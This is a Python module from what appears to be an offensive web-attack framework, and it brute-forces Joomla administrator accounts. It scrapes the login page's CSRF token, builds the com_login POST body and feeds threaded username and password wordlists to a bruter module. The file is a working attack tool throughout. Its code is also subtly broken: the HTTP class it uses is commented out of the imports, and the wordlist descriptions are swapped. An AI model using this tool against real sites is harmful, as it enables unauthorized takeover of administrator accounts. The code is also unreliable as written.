#  Copyright 2012 Kid :">

from w2a.core.templates import Templates
from w2a.config import CONFIG
# from w2a.lib.net.http import HTTP

from re import search
from copy import deepcopy
class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Brute joomla administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.options.add_string('URL', 'Link login')
		self.options.add_string('USERNAME', 'Account login', False, default = 'admin')
		self.options.add_string('PASSWORD', 'Password login', False)
		self.options.add_integer('THREADS', 'Thread of bruter', default = 10)
		self.options.add_boolean('VERBOSE', 'Verbose', default = True)
		self.options.add_path('USERLIST', 'File containing passwords to test', default = CONFIG.DATA_PATH + '/brute/username.lst')
		self.options.add_path('PASSLIST', 'File containing usernames to test', default = CONFIG.DATA_PATH + '/brute/pass.vn')
		
		self.advanced_options.add_integer('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
		self.advanced_options.add_integer('DELAY', 'Delay time if thread = 1', default = 1)

	def run(self, frmwk, args):
		self.frmwk			= frmwk
		self.module_name	= 'attack/web_bruter'
		checktype		= 'successstr'
		tokenstr		= 'no-unread-messages'

		self.frmwk.print_status('Init paprams!')
		self.victim				= HTTP(self.options['URL'], timeout = self.advanced_options['TIMEOUT'])
		self.victim.storecookie	= True

		self.frmwk.print_status('Start bruteforcer!')
		brute	= self.frmwk.modules[self.module_name]
		brute.options.add_string('URL', 'Link login', default = self.options['URL'])
		brute.options.add_string('USERNAME', 'Account login', default = self.options['USERNAME'])
		brute.options.add_string('PASSWORD', 'Password login', default = self.options['PASSWORD'])
		brute.options.add_string('DATA', 'Date with POST method', default = '')
		brute.options.add_string('CHECKTYPE', 'Type of checker success login', default = checktype)
		brute.options.add_string('TOKEN', 'Error string', default = tokenstr)
		brute.options.add_integer('THREADS', 'Date with POST method', default = self.options['THREADS'])
		brute.options.add_path('USERLIST', 'passwords to test', default = self.options['USERLIST'])
		brute.options.add_path('PASSLIST', 'usernames to test', default = self.options['PASSLIST'])
		brute.options.add_boolean('VERBOSE', 'Verbose', default = self.options['VERBOSE'])
		brute.advanced_options.add_string('COOKIE', 'Cookie', default = None)
		brute.advanced_options.add_integer('DELAY', 'Delay time', default = self.advanced_options['DELAY'])
		brute.advanced_options.add_integer('TIMEOUT', 'Time out request', default = self.advanced_options['TIMEOUT'])
		brute.advanced_options.add_boolean('STOP', 'Stop scanning', default = True)
		brute.initcallbacker	= self.initer
		brute.run(self.frmwk, None)
		self.login				= brute.success
		self.frmwk.reload_module(self.module_name)

	def initer(self):
		victim		= deepcopy(self.victim)
		data		= victim.Request(self.options['URL'], 'GET')
		token		= search('name="([a-zA-Z0-9]{32})"\svalue="1"', data)
		if token:
			token	= token.group(1)
			self.frmwk.print_success('Found token: ' + token)
		else:
			self.frmwk.print_error('Cann\'t get token!')
			return None
		param		= 'username=__USER__&passwd=__PASS__&lang=&option=com_login&task=login&return=aW5kZXgucGhw&%s=1' % token
		cookie 		= victim.cookie if victim.cookie else ''
		return None,{'Cookie': cookie},param		